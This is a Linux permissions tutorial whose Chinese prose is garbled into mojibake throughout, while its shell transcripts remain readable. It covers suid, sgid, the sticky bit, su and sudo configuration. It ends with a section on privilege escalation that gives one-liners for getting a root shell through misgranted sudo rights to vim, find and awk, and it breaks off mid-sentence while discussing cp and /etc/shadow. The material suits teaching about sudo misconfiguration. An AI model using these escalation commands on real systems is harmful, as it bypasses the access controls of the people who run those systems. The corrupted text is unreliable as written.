é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆä¼šç»™è¿™ä¸ªæ–‡ä»¶ä¸€ä¸ªå«åšsuidçš„æƒé™å‘¢ï¼Ÿè¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨æ¥ä¿®æ”¹å¯†ç çš„æ‰§è¡Œæ–‡ä»¶ï¼Œæ™®é€šç”¨æˆ·æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥ä¿®æ”¹è‡ªå·±çš„å¯†ç å•Šï¼Œå¯¹å§ï¼Œä½†æ˜¯ä¿®æ”¹å¯†ç ä¿®æ”¹çš„æ˜¯/etc/shadowæ–‡ä»¶å†…å®¹ï¼Œçœ‹ä¸€ä¸‹/etc/shadowæ–‡ä»¶æƒé™ï¼š[root@localhost ~]# ll /etc/shadow---------- 1 root root 768 3æœˆ 27 10:45 /etc/shadow# /etc/shadowæ–‡ä»¶æƒé™æ˜¯000ï¼Œæ™®é€šç”¨æˆ·æ ¹æœ¬å°±æ²¡æœ‰ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶çš„æƒé™ã€‚å› ä¸ºå¦‚æœæ™®é€šç”¨æˆ·èƒ½ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆrootç”¨æˆ·çš„å¯†ç å°±èƒ½è¢«æ™®é€šç”¨æˆ·ä¿®æ”¹äº†ï¼Œè¿™å°±å¾ˆä¸å®‰å…¨ï¼Œå¯¹å§ã€‚ä½†æ˜¯æ¯æ¬¡æ”¹å¯†ç éƒ½æ‰¾rootç”¨æˆ·ï¼Œä¹Ÿæ˜¯å¾ˆéº»çƒ¦çš„ï¼Œæ‰€ä»¥æ™®é€šç”¨æˆ·ä¹Ÿæœ‰è‡ªå·±æ”¹å¯†ç çš„éœ€æ±‚ï¼Œè¿™æ€ä¹ˆåŠã€‚æ¯”å¦‚æˆ‘ä»¬ç™»å½•ä¸€ä¸‹æ™®é€šç”¨æˆ·ï¼Œä¿®æ”¹ä¸€ä¸‹å¯†ç è¯•è¯•[jaden@localhost ~]$ passwd æ›´æ”¹ç”¨æˆ· jaden çš„å¯†ç  ã€‚ ä¸º jaden æ›´æ”¹ STRESS å¯†ç ã€‚ ï¼ˆå½“å‰ï¼‰UNIX å¯†ç ï¼š # æ™®é€šç”¨æˆ·ä¿®æ”¹å¯†ç ï¼Œå¿…é¡»è¦è¾“å…¥åŸæ¥çš„å¯†ç ï¼Œrootç”¨æˆ·ä¸éœ€è¦ æ–°çš„ å¯†ç ï¼š # è€Œä¸”å¯†ç å¤æ‚åº¦è¦é«˜ï¼Œæ¯”å¦‚æˆ‘è®¾ç½®çš„æ˜¯123@qq.comï¼Œæ‰è¡Œ æ— æ•ˆçš„å¯†ç ï¼š å¯†ç å°‘äº 8 ä¸ªå­—ç¬¦ [jaden@localhost ~]$ passwd æ›´æ”¹ç”¨æˆ· jaden çš„å¯†ç  ã€‚ ä¸º jaden æ›´æ”¹ STRESS å¯†ç ã€‚ ï¼ˆå½“å‰ï¼‰UNIX å¯†ç ï¼š æ–°çš„ å¯†ç ï¼š é‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼š passwdï¼šæ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚# æ™®é€šç”¨æˆ·ä¿®æ”¹å¯†ç å…¶å®æ¯”è¾ƒéº»çƒ¦ï¼Œè¦è¾“å…¥åŸå¯†ç ã€è¿˜è¦å°†å¯†ç å¤æ‚åº¦åŠ é«˜ã€‚# æ™®é€šç”¨æˆ·ä¹Ÿè¦ç”¨passwdä¿®æ”¹å¯†ç ï¼Œæœ‰è¿™ç§éœ€æ±‚ï¼Œæ‰€ä»¥ç»™ç³»ç»Ÿç»™passwdæ‰§è¡Œæ–‡ä»¶äº†ä¸€ä¸ªç‰¹æ®Šæƒé™ï¼Œå°±æ˜¯sã€‚[root@localhost ~]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 4æœˆ 1 2020 /usr/bin/passwd# é‚£ä¹ˆæ™®é€šç”¨æˆ·ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥æ‹¥æœ‰è¿™ä¸ªæ–‡ä»¶å±ä¸»çš„æ‰§è¡Œæƒé™ï¼Œä¹Ÿå°±æ˜¯rootçš„xæƒé™ã€‚æ‰€ä»¥æˆ‘ä»¬çœ‹åˆ°æ™®é€šç”¨æˆ·å¯ä»¥ä½¿ç”¨passwdæ¥ä¿®æ”¹è‡ªå·±çš„å¯†ç ï¼Œè¿™å°±æ˜¯suidæƒé™çš„æ„æ€ï¼Œä½†æ˜¯åªèƒ½ä¿®æ”¹å½“å‰è‡ªå·±çš„ç”¨æˆ·å¯†ç ï¼Œè€Œä¸”æ˜¯ç”¨çš„rootèº«ä»½æ¥æ‰§è¡Œçš„ï¼Œå¦‚ä¸‹ï¼Œç”¨æ™®é€šç”¨æˆ·ä¿®æ”¹ä¸€ä¸‹rootç”¨æˆ·çš„å¯†ç ï¼Œçœ‹çœ‹æ•ˆæœ[jaden@localhost ~]$ passwd root passwdï¼šåªæœ‰æ ¹ç”¨æˆ·æ‰èƒ½æŒ‡å®šç”¨æˆ·åã€‚ # åªæœ‰rootç”¨æˆ·æ‰èƒ½æŒ‡å®šç”¨æˆ·åæ¥ä¿®æ”¹æŸä¸ªç”¨æˆ·çš„å¯†ç ï¼Œæ™®é€šç”¨æˆ·ä¸èƒ½æŒ‡å®šç”¨æˆ·åï¼Œåªèƒ½ä¿®æ”¹è‡ªå·±çš„ã€‚# å¦‚æœå°†passwdæ–‡ä»¶çš„sæƒé™å»æ‰äº†ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·å°±æ²¡æœ‰ä¿®æ”¹å¯†ç çš„èƒ½åŠ›äº†ï¼Œå¦‚ä¸‹ [root@localhost ~]# chmod u-s /usr/bin/passwd [root@localhost ~]# ll /usr/bin/passwd -rwxr-xr-x. 1 root root 27856 4æœˆ 1 2020 /usr/bin/passwd# åˆ‡æ¢åˆ°æ™®é€šç»™ç”¨æˆ·ä¿®æ”¹å¯†ç çœ‹æ•ˆæœï¼š [jaden@localhost ~]$ passwd æ›´æ”¹ç”¨æˆ· jaden çš„å¯†ç  ã€‚ ä¸º jaden æ›´æ”¹ STRESS å¯†ç ã€‚ ï¼ˆå½“å‰ï¼‰UNIX å¯†ç ï¼š æ–°çš„ å¯†ç ï¼š # abc.123.xx é‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼š passwd: é‰´å®šä»¤ç‰Œæ“ä½œé”™è¯¯# å‘ç°å¯†ç ä¿®æ”¹ä¸äº†äº†ã€‚å› ä¸ºpasswdæ²¡æœ‰äº†suidæƒé™ã€‚# æˆ‘ä»¬æŠŠsuidæƒé™å†ç»™åŠ å›å»å°±å¯ä»¥äº†ã€‚[root@localhost ~]# chmod u+s /usr/bin/passwd [root@localhost ~]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 4æœˆ 1 2020 /usr/bin/passwd## netstat -ltp# rootç”¨æˆ·èº«ä»½è¿è¡Œï¼Œç»“æœå¦‚ä¸‹[root@localhost ~]# netstat -ltp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN 1185/sshd tcp 0 0 localhost:smtp 0.0.0.0:* LISTEN 1330/master tcp6 0 0 [::]:ssh [::]:* LISTEN 1185/sshd tcp6 0 0 localhost:smtp [::]:* LISTEN 1330/master#æ™®é€šç”¨æˆ·è¿è¡Œï¼Œç»“æœå¦‚ä¸‹[jaden@localhost ~]$ netstat -ltp #på‚æ•°æ™®é€šç”¨æˆ·ä¸èƒ½ä½¿ç”¨ (No info could be read for -p: geteuid()=1000 but you should be root.) # çœ‹åˆ°äº† ä¸€ä¸ªæŠ¥é”™æç¤ºï¼Œå¹¶ä¸”PIDæ•°æ®æ²¡æ˜¾ç¤º Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN - tcp 0 0 localhost:smtp 0.0.0.0:* LISTEN - tcp6 0 0 [::]:ssh [::]:* LISTEN - tcp6 0 0 localhost:smtp [::]:* LISTEN -# ç»™netstatæ‰§è¡Œæ–‡ä»¶åŠ ä¸Šsuidæƒé™[root@localhost ~]# chmod u+s /usr/bin/netstat [root@localhost ~]# ll /usr/bin/netstat -rwsr-xr-x. 1 root root 155008 8æœˆ 9 2019 /usr/bin/netstat#æ™®é€šç”¨æˆ·å†è¿è¡Œï¼Œå°±ä¸æŠ¥é”™äº†ï¼Œè€Œä¸”çœ‹åˆ°äº†PIDæ•°æ®[jaden@localhost ~]$ netstat -ltp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN 1185/sshd tcp 0 0 localhost:smtp 0.0.0.0:* LISTEN 1330/master tcp6 0 0 [::]:ssh [::]:* LISTEN 1185/sshd tcp6 0 0 localhost:smtp [::]:* LISTEN 1330/master#åŠ ä¸Šsuidæƒé™ï¼Œå°±è¡¨ç¤ºæ™®é€šç”¨æˆ·ä½¿ç”¨è¿™ä¸ªæ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šç”¨rootçš„èº«ä»½æ¥è¿è¡Œã€‚#è¿™æ˜¯suidçš„ä½œç”¨ï¼Œä½†æ˜¯å¥½å¤šé»‘å®¢åˆ©ç”¨å®ƒæ¥è¿›è¡Œæ¶æ„çš„æƒé™æå‡ã€‚ sgid å…¶ä»–ç”¨æˆ·ï¼Œæ‹¥æœ‰è¯¥æ–‡ä»¶å±ç»„çš„æƒé™ locate é’ˆå¯¹å‘½ä»¤æ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯è¯»å–æ–‡ä»¶ï¼Œä¸èƒ½ç”¨æ¥æäº‹æƒ…ï¼Œæ‰€ ä»¥ç®€å•äº†è§£ä¸€ä¸‹å³å¯ã€‚ # è¿™ä¸ªsgidï¼Œæˆ‘æ‰¾äº†å¾ˆä¹…ï¼Œä¹Ÿå°±æ‰¾åˆ°ä¸€ä¸ªä¾‹å­ï¼Œå°±æ˜¯è¿™ä¸ªlocateæŒ‡ä»¤ã€‚# å…ˆå®‰è£…ä¸€ä¸‹locateæŒ‡ä»¤ï¼Œå¦‚æœä¸çŸ¥é“å®‰è£…å“ªä¸ªè½¯ä»¶åŒ…ï¼Œå°±æŸ¥è¯¢ä¸€ä¸‹yum provides locate# yum install mlocate.x86_64 -y # éœ€è¦ç”¨rootç”¨æˆ·æ¥å®‰è£…[root@localhost ~]# locate locate: æ²¡æœ‰æŒ‡å®šä»»ä½•æœç´¢æ¨¡å¼[root@localhost ~]# touch test.txt[root@localhost ~]# locate test.txt locate: æ— æ³•æ‰§è¡Œ stat () `/var/lib/mlocate/mlocate.db: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•[root@localhost ~]# ls anaconda-ks.cfg jaden jaden2 test.txt wu2.txt wulaoban.txt[root@localhost ~]# locat wulaoban.txt -bash: locat: æœªæ‰¾åˆ°å‘½ä»¤[root@localhost ~]# locate wulaoban.txt locate: æ— æ³•æ‰§è¡Œ stat () `/var/lib/mlocate/mlocate.db: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•[root@localhost ~]# updatedb # æ›´æ–°ä¸€ä¸‹æ–‡ä»¶è·¯å¾„è®°å½•çš„ç¼“å­˜ï¼Œå°±å¯ä»¥é€šè¿‡locateæŸ¥çœ‹åˆ°æ–‡ä»¶çš„è·¯å¾„äº†ã€‚[root@localhost ~]# locate wulaoban.txt /root/wulaoban.txt[root@localhost ~]# ll /var/lib/mlocate/mlocate.db -rw-r----- 1 root slocate 1389239 3æœˆ 27 13:43 /var/lib/mlocate/mlocate.db[root@localhost ~]# which locate /usr/bin/locate[root@localhost ~]# ll /usr/bin/locate -rwx--s--x 1 root slocate 40520 4æœˆ 11 2018 /usr/bin/locate[root@localhost ~]# chmod g-x /usr/bin/locate[root@localhost ~]# ll /usr/bin/locate -rwx--S--x 1 root slocate 40520 4æœˆ 11 2018 /usr/bin/locate[root@localhost ~]# chmod g+x /usr/bin/locate[root@localhost ~]# ll /usr/bin/locate -rwx--s--x 1 root slocate 40520 4æœˆ 11 2018 /usr/bin/locate#åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·[jaden@localhost ~]$ ls jaden jaden2 jaden2.txt jaden.txt[jaden@localhost ~]$ locate jaden.txt # æ™®é€šç”¨æˆ·ä¹Ÿæ˜¯åœ¨slocateç»„çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡locateæŸ¥çœ‹æ–‡ä»¶è·¯å¾„ /home/jaden/jaden.txt[jaden@localhost ~]$ updatedb updatedb: æ— æ³•ä¸º `/var/lib/mlocate/mlocate.db æ‰“å¼€ä¸´æ—¶æ–‡ä»¶[jaden@localhost ~]$ ll /usr/bin/locate -rwx--s--x 1 root slocate 40520 4æœˆ 11 2018 /usr/bin/locate# è¿™ä¸ªç®€å•äº†è§£ä¸€ä¸‹å³å¯ã€‚## sticky å«åšç²˜æ»ä½ï¼Œè¿™ä¸ªæ˜¯é’ˆå¯¹ç›®å½•çš„æƒé™ï¼Œå¾ˆå¤šç”¨æˆ·å…±åŒä½¿ç”¨çš„ç›®å½•ï¼Œå®ç°ç”¨æˆ·ä¹‹é—´ä¸èƒ½äº’ç›¸åˆ é™¤æ”¹å˜å¯¹æ–¹çš„æ–‡ä»¶çš„æƒé™# ä¾‹å­ï¼š [jaden@localhost ~]$ ll / æ€»ç”¨é‡ 20 lrwxrwxrwx. 1 root root 7 3æœˆ 15 20:10 bin - usr/bin dr-xr-xr-x. 5 root root 4096 3æœˆ 15 20:14 boot ... drwxrwxrwt. 13 root root 4096 3æœˆ 27 13:58 tmp # å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæƒé™ä½æ˜¯tï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½æœ‰ è¿™ä¸ªç›®å½•çš„æ“ä½œæƒé™ã€‚ # ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¹ˆä¸ªæƒé™å‘¢ï¼Ÿæˆ‘ä»¬è‡ªè¡Œæä¸€ä¸ªç›®å½•æ¥çœ‹æ•ˆæœï¼š[root@localhost ~]# cd /[root@localhost /]# mkdir data[root@localhost /]# chmod 777 data[root@localhost /]# ll æ€»ç”¨é‡ 20 lrwxrwxrwx. 1 root root 7 3æœˆ 15 20:10 bin - usr/bin dr-xr-xr-x. 5 root root 4096 3æœˆ 15 20:14 boot drwxrwxrwx 2 root root 6 3æœˆ 27 14:01 data drwxr-xr-x 19 root root 3160 3æœˆ 27 09:22 dev # åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·ï¼Œå»dataç›®å½•ä¸­å†™å…¥æ–‡ä»¶ [jaden@localhost ~]$ cd /data/ [jaden@localhost data]$ touch jaden.txt [jaden@localhost data]$ ls jaden.txt# å†åˆ‡æ¢åˆ°rootä¸‹ï¼Œå†™æ–‡ä»¶ [root@localhost /]# cd data/ [root@localhost data]# touch root.txt [root@localhost data]# ll æ€»ç”¨é‡ 0 -rw-rw-r-- 1 jaden jaden 0 3æœˆ 27 14:02 jaden.txt -rw-r--r-- 1 root root 0 3æœˆ 27 14:03 root.txt# ç°åœ¨è¿™ä¸ªdataç›®å½•çš„æƒé™æ˜¯777ï¼Œæ‰€ä»¥ä»»æ„ç”¨æˆ·éƒ½å¯ä»¥å¾€é‡Œé¢å†™æ–‡ä»¶ã€‚# å†åˆ‡æ¢å›æ™®é€šç”¨æˆ·ï¼Œæ¥åˆ é™¤ä¸€ä¸‹rootç”¨æˆ·åˆ›å»ºçš„root.txt[jaden@localhost data]$ ll æ€»ç”¨é‡ 0 -rw-rw-r-- 1 jaden jaden 0 3æœˆ 27 14:02 jaden.txt -rw-r--r-- 1 root root 0 3æœˆ 27 14:03 root.txt [jaden@localhost data]$ rm -rf root.txt [jaden@localhost data]$ ll æ€»ç”¨é‡ 0 -rw-rw-r-- 1 jaden jaden 0 3æœˆ 27 14:02 jaden.txt# åˆ é™¤æˆåŠŸäº†ã€‚è¿™å°±å®¹æ˜“æ··ä¹±äº†ï¼Œä¸åŒç”¨æˆ·ä¹‹é—´çš„æ–‡ä»¶éƒ½å¯ä»¥äº’ç›¸ä¿®æ”¹åˆ é™¤ç­‰ã€‚# åˆ›å»ºdataç›®å½•çš„ç›®çš„å°±æ˜¯è®©å¤§å®¶å…±äº«è¿™ä¸ªç›®å½•ï¼Œä½†æ˜¯ä¸èƒ½è®©ç”¨æˆ·åšä¸€äº›æ¶æ„çš„æ“ä½œï¼Œæ¯”å¦‚æ¶æ„åˆ é™¤å…¶ä»–ç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨åˆ°sticky ç²˜æ»ä½æ¥æ ‡è®°è¿™ä¸ªç›®å½•ï¼Œå¦‚ä¸‹[root@localhost data]# chmod o+t /data/[root@localhost data]# cd ..[root@localhost /]# ll æ€»ç”¨é‡ 20 lrwxrwxrwx. 1 root root 7 3æœˆ 15 20:10 bin - usr/bin dr-xr-xr-x. 5 root root 4096 3æœˆ 15 20:14 boot drwxrwxrwt 2 root root 23 3æœˆ 27 14:04 data drwxr-xr-x 19 root root 3160 3æœˆ 27 09:22 dev# æ­¤æ—¶å†ç”¨rootåœ¨dataç›®å½•ä¸­å»åˆ›å»ºä¸ªroot.txtæ–‡ä»¶[root@localhost /]# cd data/[root@localhost data]# touch root.txt[root@localhost data]# ll æ€»ç”¨é‡ 0 -rw-rw-r-- 1 jaden jaden 0 3æœˆ 27 14:02 jaden.txt -rw-r--r-- 1 root root 0 3æœˆ 27 14:08 root.txt# å†åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·ï¼Œåˆ é™¤root.txtè¯•è¯•[jaden@localhost data]$ llæ€»ç”¨é‡ 0 -rw-rw-r-- 1 jaden jaden 0 3æœˆ 27 14:02 jaden.txt -rw-r--r-- 1 root root 0 3æœˆ 27 14:08 root.txt [jaden@localhost data]$ rm -rf root.txt rm: æ— æ³•åˆ é™¤root.txt: ä¸å…è®¸çš„æ“ä½œ# ç²˜æ»ä½ä¿æŠ¤äº†å…±äº«ç›®å½•ä¸­ï¼Œä¸åŒç”¨æˆ·ä¹‹é—´ä¸èƒ½äº’ç›¸åˆ é™¤å¯¹æ–¹çš„æ–‡ä»¶ã€‚# /tmp/ç›®å½•å°±æ˜¯è¿™ä¹ˆä¸€ä¸ªç›®å½•ã€‚## æŸ¥çœ‹ /tmp ç›®å½•çš„æƒé™[root@localhost data]# stat /tmp æ–‡ä»¶ï¼š/tmp å¤§å°ï¼š4096 å—ï¼š8 IO å—ï¼š4096 ç›®å½• è®¾å¤‡ï¼š801h/2049d Inodeï¼š75 ç¡¬é“¾æ¥ï¼š13 æƒé™ï¼š(1777/drwxrwxrwt) ... # 1777ï¼Œè¿™ä¸ª1å°±æ˜¯ç²˜æ»ä½æƒé™çš„å€¼ï¼Œsuidè¿™ä¸ªå€¼æ˜¯4ï¼Œsgidè¿™ä¸ªå€¼æ˜¯2ã€‚ 2.24.6 suå’Œsudo6-1 su# suå…¨ç§°ï¼šswitch user# rootç”¨æˆ·å¯ä»¥å¾ˆæ–¹ä¾¿çš„åˆ‡æ¢åˆ°ä»»æ„ç”¨æˆ·[root@localhost ~]# su - jaden ä¸Šä¸€æ¬¡ç™»å½•ï¼šä¸€ 3æœˆ 27 15:03:29 CST 2023ä» 192.168.2.110pts/1 ä¸Š[jaden@localhost ~]$ ls jaden jaden2 jaden2.txt jaden.txt [jaden@localhost ~]$ exit # é€€å‡ºï¼Œåˆå›åˆ°rootç”¨æˆ·äº† ç™»å‡º[root@localhost ~]# # æ™®é€šç”¨æˆ·åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œå¿…é¡»è¾“å…¥rootå¯†ç [jaden@localhost ~]$ su - root å¯†ç ï¼š # éœ€è¦è¾“å…¥rootç”¨æˆ·çš„å¯†ç  ä¸Šä¸€æ¬¡ç™»å½•ï¼šä¸€ 3æœˆ 27 10:48:24 CST 2023ä» 192.168.2.110pts/0 ä¸Š[root@localhost ~]# exit ç™»å‡º[jaden@localhost ~]$ # ä¸å¸¦-ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¸¦-çš„è¯ï¼Œå°±æ˜¯åˆ‡æ¢å®Œç”¨æˆ·ä¹‹åï¼Œç›´æ¥åˆ°ç”¨æˆ·å®¶ç›®å½•ä¸‹ï¼Œä¸å¸¦-å°±ä¸æ˜¯å®¶ç›®å½•ã€‚[jaden@localhost ~]$ su root å¯†ç ï¼š[root@localhost jaden]# exit 6-2 sudo## sudoå…¨ç§°ï¼šsuperuser doï¼Œå®ƒçš„ä½œç”¨æ˜¯ç”¨æ¥æˆæƒçš„ã€‚å°±æ˜¯ç»™æ™®é€šç”¨æˆ·é«˜çº§æƒé™ç”¨çš„ã€‚åŸå› å°±æ˜¯å¾ˆå¤šçš„æ“ä½œï¼Œå¦‚æœéƒ½éœ€è¦rootç”¨æˆ·å»åšï¼Œå¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥å¯ä»¥ç»™æ™®é€šç”¨æˆ·åšä¸€äº›æˆæƒï¼Œæ™®é€šç”¨æˆ·æ“ä½œå°±æ–¹ä¾¿äº†ã€‚æˆæƒå°±ç”¨åˆ°äº†sudoï¼Œsudoå¹¶ä¸æ˜¯ä¸€ä¸‹å­ç»™ç”¨æˆ·å¾ˆå¤šæƒé™ï¼Œè€Œæ˜¯ä¸€ä¸ªå‘½ä»¤ä¸€ä¸ªå‘½ä»¤çš„æˆæƒã€‚## sudoéœ€è¦ä¿®æ”¹é…ç½®æ‰èƒ½å¼€å¯ã€‚# rootç”¨æˆ·æ‰èƒ½ä¿®æ”¹è¿™ä¸ªé…ç½®ã€‚1.é…ç½®/etc/sudoers # ç›´æ¥visudoå°±èƒ½ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ [root@localhost ~]# visudo #ç”¨æˆ·å æ‰€æœ‰ç»ˆç«¯ = è¿è¡Œçš„ç”¨æˆ·èº«ä»½ å‘½ä»¤ALLï¼ŒALLæ˜¯æ‰€æœ‰æŒ‡ä»¤ï¼Œä¸èƒ½ç»™æ‰€æœ‰çš„ï¼Œä¸ç„¶æƒé™å¤ªé«˜äº† #åœ¨100è¡Œä¸‹é¢æ·»åŠ å¦‚ä¸‹å†…å®¹ jaden ALL=(ALL) /bin/systemctl,/usr/bin/vim,/usr/sbin/reboot # å•ç‹¬ç»™æŒ‡ä»¤ æƒé™ï¼Œè€Œä¸”è¦å†™æŒ‡ä»¤çš„ç»å¯¹è·¯å¾„ï¼Œé€—å·åˆ†å‰² # ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶ï¼Œä¿å­˜é€€å‡ºä¹‹åï¼Œç«‹é©¬å°±ç”Ÿæ•ˆäº†ï¼Œä¸éœ€è¦é‡å¯æˆ–è€…é‡æ–°ç™»å½•ã€‚ #åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·ï¼ŒæŸ¥çœ‹å¯ä»¥ä½¿ç”¨çš„æˆæƒå‘½ä»¤ sudo -l [jaden@localhost ~]$ sudo -l ## æˆ‘ä»¬ä¿¡ä»»æ‚¨å·²ç»ä»ç³»ç»Ÿç®¡ç†å‘˜é‚£é‡Œäº†è§£äº†æ—¥å¸¸æ³¨æ„äº‹é¡¹ã€‚ ## æ€»ç»“èµ·æ¥æ— å¤–ä¹è¿™ä¸‰ç‚¹ï¼š #1) å°Šé‡åˆ«äººçš„éšç§ã€‚ #2) è¾“å…¥å‰è¦å…ˆè€ƒè™‘(åæœå’Œé£é™©)ã€‚ #3) æƒåŠ›è¶Šå¤§ï¼Œè´£ä»»è¶Šå¤§ã€‚ [sudo] jaden çš„å¯†ç ï¼š # éœ€è¦è¾“å…¥jadenç”¨æˆ·çš„å¯†ç  åŒ¹é… %2$s ä¸Š %1$s çš„é»˜è®¤æ¡ç›®ï¼š !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS, env_keep+=MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE, env_keep+=LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES, env_keep+=LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE, env_keep+=LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin ç”¨æˆ· jaden å¯ä»¥åœ¨ localhost ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š # æç¤ºå¯ä»¥ä½¿ç”¨sudoæ¥æ‰§è¡Œçš„å‘½ä»¤ (ALL) /bin/systemctl, /usr/bin/vim, /usr/sbin/reboot [jaden@localhost ~]$ 2.ä½¿ç”¨sudoæ‰§è¡Œå‘½ä»¤# æˆæƒçš„å‘½ä»¤ä½¿ç”¨èµ·æ¥å’Œæ™®é€šæŒ‡ä»¤æ˜¯ä¸åŒçš„ï¼Œéœ€è¦ä½¿ç”¨sudoæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯ä»¥æˆæƒçš„æ–¹å¼æ¥æ‰§è¡ŒæŒ‡ä»¤ã€‚# æ¯”å¦‚rebooté‡å¯ [jaden@localhost ~]$ sudo reboot Connection closing...Socket close. Connection closed by foreign host....# æ¯”å¦‚é‡å¯ç½‘å¡# sudo systemctl restart network #start,stop,restart# æ¯”å¦‚ï¼švimæƒé™ [jaden@localhost ~]$ vim /etc/shadow [jaden@localhost ~]$ sudo vim /etc/shadow # æ³¨æ„ï¼Œvimçš„æƒé™å¾ˆå¤§ï¼Œæ¯”å¦‚å¯ä»¥ä¿®æ”¹å¯†ç ï¼Œå¯ä»¥ä¿®æ”¹æˆæƒé…ç½®æ–‡ä»¶ç­‰ï¼Œç”šè‡³rootç”¨æˆ·çš„å¯†ç éƒ½å¯ä»¥ä¿®æ”¹ï¼Œæ‰€ä»¥ä¸è¦å°†vimçš„rootæƒé™ç»™æ™®é€šç”¨æˆ·ã€‚ 2.24.7 linuxæ™®é€šç”¨æˆ·ææƒ7-1 sudoææƒå°±æ˜¯æˆ‘ä»¬è¿›è¡Œsudoæˆæƒæ—¶ç»™çš„æˆæƒå¤ªé«˜ï¼Œæˆ–è€…ç»™æˆæƒæ—¶æ§åˆ¶çš„ä¸åˆç†ï¼Œå°±ä¼šè¢«æ™®é€šç”¨æˆ·åˆ©ç”¨æ¥ææƒã€‚ ç¤ºä¾‹1ï¼š vim # å‘½ä»¤æ¨¡å¼æ‰§è¡Œ: !/ # é€šè¿‡vimä¿®æ”¹/etc/sudoersï¼ŒæˆæƒALL # å†é€šè¿‡vimè¿›å…¥ä¸€ä¸ªæ–‡ä»¶ # :è¾“å…¥æŒ‡ä»¤ï¼Œæ˜¯å¯ä»¥ç›´æ¥è¾“å…¥ç³»ç»ŸæŒ‡ä»¤çš„ï¼Œå‰é¢åŠ ä¸€ä¸ª!å³å¯ï¼Œæ¯”å¦‚åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œ!touch 3.txt # æŸ¥çœ‹3.txtä¿¡æ¯å¦‚ä¸‹ [jaden@localhost ~]$ ll æ€»ç”¨é‡ 0 -rw-r--r-- 1 root root 0 3æœˆ 27 17:05 3.txt # ä»¥rootç”¨æˆ·èº«ä»½åˆ›å»ºçš„æ–‡ä»¶ # å¦‚æœåœ¨vimæ–‡ä»¶æ—¶ï¼Œæ‰§è¡Œ!/bin/bashï¼Œå°±è¿›å…¥åˆ°äº†rootçš„å‘½ä»¤ç»ˆç«¯ï¼Œå¯ä»¥ä¸ºæ‰€æ¬²ä¸ºã€‚ # è¿™å°±æ˜¯sudoææƒï¼Œä½†æ˜¯sudoææƒéœ€è¦å€ŸåŠ©åˆ°å¯ä»¥æ‰§è¡Œç³»ç»ŸæŒ‡ä»¤çš„äº¤äº’å¼çš„åŠŸèƒ½ï¼Œæ¯”å¦‚vimã€‚ç¤ºä¾‹2ï¼š find # sudo find . -exec bash \\; # ç›´æ¥è¿›å…¥rootçš„å‘½ä»¤ç»ˆç«¯ï¼Œè¿™ä¸ªæŒ‡ä»¤é€€å‡ºrootç»ˆç«¯å¯èƒ½è¦é€€å¥½å‡ æ¬¡æ‰è¡Œï¼Œçœ‹findæ‰¾åˆ°äº†å‡ ä¸ªæ–‡ä»¶ï¼Œæ‰¾åˆ°äº†3ä¸ªæ–‡ä»¶ï¼Œå°±è¾“å…¥ä¸‰æ¬¡exitæ‰èƒ½é€€å‡ºã€‚find åé¢æ–‡ä»¶åéšä¾¿å†™ ç¤ºä¾‹3ï¼š awk # sudo awk BEGIN system(/bin/bash) jaden.txt # ç›´æ¥è¿›å…¥åˆ°rootå‘½ä»¤ç»ˆç«¯ï¼Œexitç›´æ¥é€€å‡ºã€‚ # è¿˜æœ‰å¥½å¤šæŒ‡ä»¤å¯ä»¥ææƒï¼Œæ¯”å¦‚cpå‘½ä»¤ä¹Ÿå¯ä»¥ææƒï¼Œå°†å…¶ä»–ç”µè„‘ä¸Šçš„/etc/shadowæ–‡ä»¶æ‹·è´åˆ°è¿™ä¸ªç³»ç»Ÿä¸­ï¼Œå¯†ç 